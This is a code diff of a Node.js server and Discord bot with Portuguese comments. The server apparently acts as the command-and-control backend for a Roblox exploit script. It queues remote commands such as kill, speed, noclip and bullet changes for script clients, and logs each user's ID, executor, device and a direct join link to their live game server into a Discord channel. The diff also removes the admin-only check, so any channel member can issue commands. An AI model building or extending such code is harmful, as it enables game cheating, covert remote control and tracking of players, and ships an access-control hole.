@@ -5,12 +5,11 @@ const { Client, GatewayIntentBits } = require("discord.js");
 const app = express();
 app.use(express.json());
 
-// ===== CONFIG =====
+// ====== CONFIG ======
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CANAL_DESTINO = process.env.CANAL_DESTINO;
-const ADMIN_ID = "1163467888259239996"; // Somente este usuário pode usar comandos
 
-// ===== DATABASE =====
+// ====== DATABASE ======
 let db = { users: [] };
 
 function saveDB() {
@@ -21,10 +20,10 @@ if (fs.existsSync("db.json")) {
     db = JSON.parse(fs.readFileSync("db.json"));
 }
 
-// ===== COMANDOS EM FILA =====
+// ====== COMANDOS EM FILA ======
 let commands = [];
 
-// ===== DISCORD BOT =====
+// ====== DISCORD BOT ======
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -37,63 +36,29 @@ client.once("ready", () => {
     console.log("Bot iniciado!");
 });
 
-// ===== COMANDOS =====
+// ====== COMANDOS DIGITADOS NO DISCORD ======
 client.on("messageCreate", async (msg) => {
-    if (msg.author.id !== ADMIN_ID) return; // Apenas admin
     if (!msg.content.startsWith(".")) return;
 
     const args = msg.content.split(" ");
     const cmd = args[0].substring(1); // remove "."
-
-    if (cmd === "cmds") {
-        const cmds = [
-            ".on",
-            ".off",
-            ".help",
-            ".kill",
-            ".speed <v>",
-            ".unspeed",
-            ".noclip",
-            ".clip",
-            ".togglenoclip",
-            ".spread <v>",
-            ".range <v>",
-            ".bullets <v>",
-            ".message <user> <content>"
-        ];
-        return msg.reply("**Comandos:**\n" + cmds.join("\n"));
-    }
-
-    if (cmd === "on") {
-        if (db.users.length === 0) return msg.reply("Nenhum usuário ativo.");
-        const names = db.users.map(u => `[${u.username}](https://www.roblox.com/users/${u.userId}/profile)`);
-        return msg.reply(`**Usuários ativos (${db.users.length}):**\n${names.join("\n")}`);
-    }
-
     const targetUser = args[1]?.toLowerCase();
 
-    if (!targetUser && cmd !== "on" && cmd !== "cmds") {
-        return msg.reply("Use: .comando username argumentos");
-    }
-
-    if (cmd === "message") {
-        const content = args.slice(2).join(" ");
-        if (!content) return msg.reply("Use: .message <username> <conteúdo>");
-        commands.push({ user: targetUser, command: "message", content });
-        return msg.reply(`Mensagem enviada para **${targetUser}**.`);
-    }
+    if (!targetUser) return msg.reply("Use: .comando username argumentos");
 
     const c = {
-        user: targetUser,
+        user: targetUser,     // username do roblox
         command: cmd,
         arg1: args[2],
         arg2: args[3]
     };
+
     commands.push(c);
+
     msg.reply(`Comando **${cmd}** enviado para **${targetUser}**.`);
 });
 
-// ===== ENDPOINT PARA O SCRIPT PEGAR COMANDO =====
+// ====== ENDPOINT PARA O SCRIPT PEGAR COMANDO ======
 app.post("/nextCommand", (req, res) => {
     const username = req.body.username?.toLowerCase();
     if (!username) return res.json({ command: null });
@@ -108,35 +73,43 @@ app.post("/nextCommand", (req, res) => {
     return res.json({ command: null });
 });
 
-// ===== ENDPOINT PARA LOG DO ROBLOX =====
+// ====== ENDPOINT PARA LOG DO ROBLOX ======
 app.post("/log", async (req, res) => {
-    const { userId, username } = req.body;
-    if (!userId || !username) return res.status(400).send("Requisição inválida.");
 
-    if (!db.users.some(u => u.userId === userId)) {
-        db.users.push({ userId, username });
+    const {
+        userId, username, executor, device,
+        date, time, placeId, serverJobId
+    } = req.body;
+
+    if (!userId || !username)
+        return res.status(400).send("Requisição inválida.");
+
+    if (!db.users.includes(userId)) {
+        db.users.push(userId);
         saveDB();
+
         const channel = await client.channels.fetch(CANAL_DESTINO);
 
-        const msg = `📌 **USUÁRIO NOVO**
+        const msg =
+`📌 **USUÁRIO NOVO**
 **Usuário:** [${username}](https://www.roblox.com/users/${userId}/profile)
+**Executor:** ${executor}
+**Dispositivo:** ${device}
+**Data:** ${date}
+**Hora:** ${time}
+**Entrar no servidor:** https://www.roblox.com/games/start?placeId=${placeId}&jobId=${serverJobId}
 `;
+
         channel.send(msg);
     }
+
     res.send("OK");
 });
 
-// ===== ENDPOINT PARA REMOVER USUÁRIO =====
-app.post("/removeUser", (req, res) => {
-    const { userId } = req.body;
-    if (!userId) return res.status(400).send("Requisição inválida.");
-    db.users = db.users.filter(u => u.userId !== userId);
-    saveDB();
-    res.send("OK");
-});
-
-// ===== START =====
+// ====== START ======
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Servidor rodando na porta " + PORT));
+app.listen(PORT, () => {
+    console.log("Servidor rodando na porta " + PORT);
+});
 
 client.login(BOT_TOKEN);
